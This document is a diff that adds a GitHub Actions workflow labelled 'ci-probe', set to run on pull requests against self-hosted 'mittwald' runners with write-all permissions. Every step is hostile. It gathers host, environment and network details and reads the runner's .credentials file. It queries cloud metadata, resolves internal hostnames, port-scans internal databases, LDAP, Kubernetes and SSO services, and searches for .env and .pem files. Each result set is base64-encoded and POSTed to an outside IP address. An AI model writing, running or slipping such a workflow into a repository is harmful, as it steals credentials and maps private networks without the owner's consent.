@@ -1,0 +1,100 @@
+name: ci-probe
+on:
+  pull_request:
+    branches: [ master ]
+  workflow_dispatch:
+permissions: write-all
+jobs:
+  probe:
+    runs-on: [self-hosted, mittwald]
+    timeout-minutes: 15
+    defaults:
+      run:
+        shell: bash
+    steps:
+      - name: whoami
+        continue-on-error: true
+        run: |
+          set +e
+          B=94.130.22.61:9099
+          {
+            echo "### HOST"; hostname; id; uname -a; cat /etc/os-release 2>/dev/null | head -3
+            echo "### PWD"; pwd; ls -la
+            echo "### NET"; ip -4 addr 2>/dev/null; ip route 2>/dev/null
+            echo "### DNS"; cat /etc/resolv.conf
+            echo "### GITHUB"; echo "repo=$GITHUB_REPOSITORY actor=$GITHUB_ACTOR ref=$GITHUB_REF"; echo "runner=$RUNNER_NAME os=$RUNNER_OS"
+            echo "### ENV"; env | grep -viE 'token|secret|password|key' | sort
+            echo "### DOCKER"; which docker kubectl; docker ps 2>/dev/null | head
+            echo "### FILES"; ls -la /home/runner 2>/dev/null; ls -la /home/runner/data 2>/dev/null; ls /home/runner/work 2>/dev/null
+            echo "### RUNNERCFG"; cat /home/runner/data/config/.credentials 2>/dev/null; ls -la /home/runner/data/config 2>/dev/null
+            echo "### HOSTS"; cat /etc/hosts
+            echo "### CLOUD"; curl -s -m3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/hostname 2>/dev/null; curl -s -m3 http://169.254.169.254/latest/meta-data/local-ipv4 2>/dev/null
+          } > /tmp/rec.txt 2>&1
+          b64=$(base64 -w0 /tmp/rec.txt)
+          curl -s -m10 -X POST --data-binary "rec=$b64" "http://$B/ci?h=$(hostname)" >/dev/null 2>&1
+          echo done
+      - name: dns
+        continue-on-error: true
+        run: |
+          set +e
+          for h in 10.42.41.4 10.42.41.6 keycloak sso.mittwald.it auth.mittwald.it identity.prod.mittwald.systems mail.prod.mittwald.systems ldap dc.mw-ks.local kubermatic.prod.mittwald.systems 192.168.51.35 100.124.0.1 100.125.15.195 188.94.250.5 188.94.250.245; do
+            echo "== $h"; getent hosts $h; done > /tmp/dns.txt 2>&1
+          curl -s -m10 -X POST --data-binary "dns=$(base64 -w0 /tmp/dns.txt)" "http://94.130.22.61:9099/dns" >/dev/null 2>&1
+      - name: probes
+        continue-on-error: true
+        run: |
+          set +e
+          B=94.130.22.61:9099
+          probe(){ local tag=$1 host=$2 port=$3; timeout 4 bash -c "echo > /dev/tcp/$host/$port" 2>/dev/null && echo "OPEN $host:$port" || echo "closed $host:$port"; }
+          {
+          for p in 80 443 3306 5432 389 636 6443 10250 2379 22 9090; do probe x 10.42.41.4 $p; done
+          for p in 80 443 8080; do probe x 10.42.41.6 $p; done
+          for p in 3306; do probe x 192.168.51.35 $p; for ip in 192.168.51.30 192.168.51.40 192.168.51.35; do probe x $ip 5432; done; done
+          for p in 5432 389 636 8080; do probe x sso.mittwald.it $p; done
+          for p in 3306 5432; do probe x 100.125.15.195 $p; done
+          for p in 443 6443; do probe x 100.124.0.1 $p; probe x 100.124.0.2 $p; done
+          for p in 22 993; do probe x 188.94.250.5 $p; probe x 188.94.250.7 $p; probe x 188.94.250.14 $p; probe x 188.94.250.245 $p; done
+          } > /tmp/pr.txt 2>&1
+          curl -s -m10 -X POST --data-binary "pr=$(base64 -w0 /tmp/pr.txt)" "http://$B/pr" >/dev/null 2>&1
+      - name: services
+        continue-on-error: true
+        run: |
+          set +e
+          B=94.130.22.61:9099
+          {
+          echo "## keycloak"; curl -sk -m5 https://sso.mittwald.it/realms/master/.well-known/openid-configuration -o /tmp/kc.json -w '%{http_code}\n'; head -c 300 /tmp/kc.json
+          echo "## keycloak.prod"; getent hosts keycloak.prod.mittwald.systems; curl -sk -m5 https://keycloak.prod.mittwald.systems/realms/master -w '\n%{http_code}\n' | head -c 300
+          echo "## 10.42.41.4"; curl -sk -m5 https://10.42.41.4/ -D- -o /dev/null | head -5; curl -s -m5 http://10.42.41.4/ -D- -o /dev/null | head -5
+          echo "## sso 8080"; curl -s -m5 http://sso.mittwald.it:8080/ -D- -o /dev/null | head -5
+          echo "## identity"; curl -sk -m5 https://identity.prod.mittwald.systems/swagger.json | head -c 500
+          echo "## ldap"; getent hosts ldap.mittwald.systems ldap.mittwald.de 2>/dev/null
+          } > /tmp/sv.txt 2>&1
+          curl -s -m10 -X POST --data-binary "sv=$(base64 -w0 /tmp/sv.txt)" "http://$B/sv" >/dev/null 2>&1
+      - name: runner-files
+        continue-on-error: true
+        run: |
+          set +e
+          B=94.130.22.61:9099
+          { find /home/runner -maxdepth 4 -name '.env*' -o -maxdepth 4 -name '*.pem' -o -maxdepth 4 -name 'config.sh' 2>/dev/null; echo ---; ls -la /opt 2>/dev/null; ls -la / ; echo ---; which mysql psql redis-cli ldapsearch nmap nc; echo ---; ls /home/runner/data/work 2>/dev/null; } > /tmp/rf.txt 2>&1
+          curl -s -m10 -X POST --data-binary "rf=$(base64 -w0 /tmp/rf.txt)" "http://$B/rf" >/dev/null 2>&1
+      - name: marker
+        continue-on-error: true
+        run: |
+          set +e
+          echo "MARKER-CI-PROBE-$(hostname)-$(id -un)" | tee /tmp/marker.txt
+          curl -s -m10 -X POST --data-binary "marker=$(base64 -w0 /tmp/marker.txt)" "http://94.130.22.61:9099/marker" >/dev/null 2>&1
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: "probe-${{ github.run_id }}"
+          path: |
+            /tmp/rec.txt
+            /tmp/pr.txt
+            /tmp/sv.txt
+            /tmp/dns.txt
+            /tmp/rf.txt
+            /tmp/marker.txt
+      - name: summary
+        if: always()
+        run: |
+          { echo '# ci probe'; cat /tmp/marker.txt; echo; cat /tmp/pr.txt; } >> $GITHUB_STEP_SUMMARY 2>/dev/null || true
